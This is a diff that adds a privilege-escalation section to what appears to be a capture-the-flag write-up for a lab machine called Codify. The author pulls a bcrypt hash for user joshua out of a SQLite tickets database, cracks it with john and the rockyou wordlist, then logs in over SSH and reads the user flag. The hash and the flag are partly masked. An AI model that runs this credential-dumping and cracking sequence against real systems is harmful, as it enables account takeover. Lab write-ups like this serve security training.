@@ -82,3 +82,98 @@ svc@codify:~$ id
 id
 uid=1001(svc) gid=1001(svc) groups=1001(svc)
 ```
+
+## Escalating privileges and obtaining user flag
+
+After stabilising the shell, I've conducted the analysis of the environment. Searching for potential vector of privilege escalation, I've found the directory `/var/www` used by the node.js sandbox. Folder `contact` contained some interesting positions:
+
+```bash
+svc@codify:/var/www/contact$ ls
+index.js  package.json  package-lock.json  templates  tickets.db
+```
+
+The most interesting file is the `tickets.db` that look like a Sqlite3 database. Source code stored in `index.js` confirms that this is indeed Sqlite3:
+
+```bash
+svc@codify:/var/www/contact$ head index.js 
+const express = require('express');
+const sqlite3 = require('sqlite3').verbose();
+const bcrypt = require('bcryptjs');
+const session = require('express-session');
+const app = express();
+const port = 3001;
+
+// create a new database and table
+const db = new sqlite3.Database('tickets.db');
+db.run('CREATE TABLE IF NOT EXISTS tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)');
+```
+
+The database contains hashed password of `joshua` user:
+
+```bash
+svc@codify:/var/www/contact$ sqlite3 tickets.db 
+SQLite version 3.37.2 2022-01-06 13:25:41
+Enter ".help" for usage hints.
+sqlite> .tables
+tickets  users  
+sqlite> select * from users;
+3|joshua|$2a$***************************************************p/Zw2
+```
+
+Using `john` to crack the hash we obtain the password:
+
+```bash
+└─$ john hash --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 4096 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+s********1       (?)    
+1g 0:00:00:25 DONE (2024-03-06 18:00) 0.03921g/s 53.64p/s 53.64c/s 53.64C/s crazy1..angel123
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+With password I've been able to ssh into the machine and read the user flag:
+
+```bash
+└─$ ssh joshua@10.10.11.239
+joshua@10.10.11.239's password: 
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Mar  6 05:06:04 PM UTC 2024
+
+  System load:                      0.21630859375
+  Usage of /:                       64.5% of 6.50GB
+  Memory usage:                     29%
+  Swap usage:                       0%
+  Processes:                        253
+  Users logged in:                  0
+  IPv4 address for br-030a38808dbf: 172.18.0.1
+  IPv4 address for br-5ab86a4e40d0: 172.19.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.11.239
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Wed Mar  6 17:06:05 2024 from xx.xx.xx.xx
+joshua@codify:~$ cat user.txt 
+1e****************************94
+```
